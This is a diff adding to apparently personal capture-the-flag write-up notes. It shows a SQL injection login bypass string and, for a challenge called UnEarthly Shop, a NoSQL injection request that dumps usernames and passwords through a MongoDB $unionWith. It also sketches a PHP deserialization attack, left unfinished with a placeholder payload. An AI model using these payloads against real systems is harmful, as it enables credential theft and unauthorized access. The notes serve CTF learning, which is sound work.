@@ -128,3 +128,33 @@ if __name__ == '__main__':
 * `database.py` hints it's going to be sqli and it's pretty visible too
 * login as username `admin` password: `1" or "1"="1"-- -`
 
+## Web/UnEarthly Shop UNFINISHED
+* to get the admin password use nosql injection
+```
+POST /api/products
+
+...
+[
+{"$match":{"instock":"nope"
+}},{"$unionWith":{"coll":"users",
+"pipeline": [{
+"$project":{
+"username": 1,
+"password":1
+}}
+]
+}}
+]
+```
+* there's an unsafe `unserialize` call evaluating the `access` property of the user being logged in in `backend/models/UserModel.php`. So all that's left to do is find a working gadget/payload and update the user's access property:
+```
+POST /admin/api/users/update
+
+...
+
+
+{"_id":1,"username":"admin","password":"lacika"
+,
+"access": "<working gadget payload that I didn't find>"
+}
+```
